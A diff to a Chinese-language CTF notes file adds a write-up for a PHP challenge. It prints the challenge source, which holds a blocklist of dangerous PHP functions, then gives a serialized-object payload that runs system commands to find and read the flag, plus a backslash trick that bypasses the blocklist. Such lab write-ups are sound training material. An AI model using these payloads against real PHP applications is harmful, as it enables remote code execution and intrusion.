@@ -510,3 +510,91 @@ PD9waHAgJGZsYWc9J2ZsYWd7ZTI4NTdjODItMTliMi00MWE1LTg4MWUtZWNjMGM1ODgzZDVifSc7Cg==
 base64解码
 
 得到flag
+
+# [网鼎杯 2020 朱雀组]phpweb 1
+
+发现页面回显一直在变
+
+抓包，查看能否得到更多的信息
+
+发现index.php用post方式提交了两个参数，func和p,func=date&p=Y-m-d+h%3Ai%3As+a
+
+我们尝试猜测这两个参数的关系，可以用最简单的 php函数 MD5 来进行检测`func=md5&p=123`
+
+发先页面回显的内容就是MD5加密后的123
+
+尝试 直接查看网站页面看能否成功`func=system&p=ls /`
+
+system被过滤掉了
+
+这里我们需要查看页面源代码，进行代码审计
+
+在这里我们可以使用多种函数进行查看 例如：file_get_contents、highlight_file() ，show_source()等`func=file_get_contents&p=index.php`
+
+```php
+<?php
+$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+function gettime($func, $p) {
+    $result = call_user_func($func, $p);
+    $a= gettype($result);
+    if ($a == "string") {
+        return $result;
+    } else {return "";}
+}
+class Test {
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+$func = $_REQUEST["func"];
+$p = $_REQUEST["p"];
+
+if ($func != null) {
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) {
+        echo gettime($func, $p);
+    }else {
+        die("Hacker...");
+    }
+}
+?>
+```
+
+使用反序列化 
+
+```php
+<?php
+  class Test{
+     var p="ls /";
+     var func="system";
+     }
+     <?php
+$a=new Test();
+echo serialize($a);
+?>
+```
+
+构造payload`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}`
+
+没有flag返回上一页面`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}`
+
+发现还是没有flag的信息
+>system(“find / -name flag”)：查找所有文件名匹配flag的文件
+
+`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}`
+
+直接读取flag`func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}`
+
+这道题本质上是 我们要对黑名单进行一个绕过 所以在本关我们可以使用别的方法来达到获取flag的目的
+
+php内的" \ "在做代码执行的时候，会识别特殊字符串，绕过黑名单`func=\system&p=find / -name flag*`
+
+`func=\system&p=cat /tmp/flagoefiu4r93`
+
+
+
+
